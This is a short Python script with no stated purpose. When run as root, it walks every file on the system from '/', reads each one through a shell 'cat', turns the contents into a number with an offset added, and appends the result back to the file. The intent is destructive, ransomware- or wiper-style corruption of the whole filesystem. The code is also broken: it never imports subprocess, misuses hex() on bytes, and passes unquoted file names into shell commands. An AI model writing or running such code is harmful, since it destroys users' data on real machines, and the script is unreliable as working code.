import os
import sys

def main():
    fileList = findFiles()
    offset = int(sys.argv[1])
    for file in fileList:
        command = "cat " + file
        fileContent = subprocess.check_output(command, shell=True)
        fileBin = fileContent.encode('utf-8')
        fileHex = hex(fileBin)
        fileInt = int(fileHex)
        newInt = fileInt + offset
        newHex = hex(newInt)
        os.system('echo "' + newHex + '" >> ' + file)
    
def findFiles():
    self = str(sys.argv[0])
    excludedFiles = [self, "/bin/cat", "/bin/echo"]
    fileList = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if(file not in excludedFiles):
                path = os.path.join(root, file)
                fileList.append(path)
    return fileList
    
if(os.getuid() == 0 and len(sys.argv) == 2):
    main()